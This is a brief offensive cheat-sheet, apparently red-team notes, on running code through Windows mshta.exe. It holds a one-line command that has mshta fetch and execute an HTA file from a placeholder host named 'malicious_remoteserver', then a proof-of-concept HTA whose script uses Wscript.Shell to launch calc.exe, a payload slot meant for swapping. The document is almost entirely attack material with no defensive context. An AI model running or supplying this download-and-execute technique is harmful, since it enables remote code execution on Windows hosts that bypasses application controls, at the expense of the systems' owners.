### From mshta.exe

```
mshta.exe http://malicious_remoteserver/malware.hta
```
 
### Normal Poc.hta
```
<html>
<head>
  <script>
    var payload = 'calc.exe';
    new ActiveXObject('Wscript.Shell').Run(payload);
  </script>
</head>

<body>
  <h1>Poc </h1>
  <script>
    self.close();
  </script>
</body>
</html> 
```
